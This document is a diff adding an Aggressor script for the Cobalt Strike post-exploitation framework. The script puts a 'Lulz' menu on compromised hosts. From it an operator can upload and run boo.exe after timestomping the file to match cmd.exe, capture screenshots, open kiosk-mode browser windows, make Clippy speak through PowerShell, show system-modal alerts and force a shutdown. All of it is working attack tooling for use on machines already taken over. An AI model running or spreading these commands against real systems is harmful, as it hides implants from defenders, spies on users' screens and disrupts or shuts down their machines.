@@ -1,0 +1,61 @@
+sub boo {
+	if (-exists script_resource("boo.exe")) {
+		bcd($1, '"c:\users\public\documents"');
+		# place boo.exe in the same local directory as this script
+		blog($1,'Uploading boo.exe to c:\users\public\documents.');
+	   bupload($1, script_resource("boo.exe"));
+	   btimestomp($1, "boo.exe", 'c:\windows\system32\cmd.exe');
+	   blog($1,"Taking screenshots for the next 120 seconds.");
+	   binput($1, "screenshot");
+	   bscreenshot($1, 120);
+	   bshell($1, "start boo.exe");
+	}
+	else {
+        berror($1, "boo.exe does not exist :(");
+    }
+}
+
+
+popup beacon_bottom {
+	menu "Lulz" {		
+		item "IE Kiosk Popup" {
+			prompt_text("What site do you want to pop up?", "https://google.com", lambda({
+				binput(@ids,"C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+				bshell(@ids, "C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+			}, @ids => $1));
+		}
+		item "Clippy" {
+			#BE SURE TO RUN SET UP STEPS
+			#based on this blog post: https://mellowtigger.dreamwidth.org/250130.html
+			#
+			prompt_text("What should Clippy say?", "Try Harder", lambda({
+				$text = '$MI6 = new-object -com agent.control.2; $MI6.connected = $true; $MI6.characters.load("Clippy","Clippit.acs"); $agent = $MI6.characters.character("Clippy"); $agent.moveto(800,400); $agent.Show(); $agent.Play("Wave"); $agent.think(" ' . $1 . ' "); $agent.Play("Wave"); Start-Sleep -s 4; $agent.Play("Wave"); $agent.hide(); while ($agent.visible) { sleep -Milliseconds 100 }; $MI6.characters.unload("Clippy");';
+				binput(@ids,"$text");
+				bpowershell(@ids, "$text");
+				blog(@ids,"Clippy finished helping out.")
+			}, @ids => $1));
+		}
+		item "Windows Alert (Win 7+)" {
+			prompt_text("What should the alert say?", "Try Harder", lambda({
+				bpowershell(@ids, 'Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox("' . $1 . '", "OKOnly,MsgBoxSetForeground,SystemModal,Exclamation", "")' );
+				blog(@ids,"Creating an alert box with the following message: $1 ");
+			}, @ids => $1));
+		}
+		item "Shutdown Host" {
+			prompt_confirm("Are you SURE you want to bounce the box(es)?", "Confirm", lambda({
+				blog(@ids,"shutting down");
+				bshell(@ids, "shutdown /s /f /t 00 -d up:125:1");
+			}, @ids => $1));
+		}
+		item "Boo.exe" {
+		#Put 'boo.exe' in the same directory as this script
+		#
+		local('$bid');
+		foreach $bid ($1) {
+			boo($bid);
+			}
+		}
+
+	}
+}
+
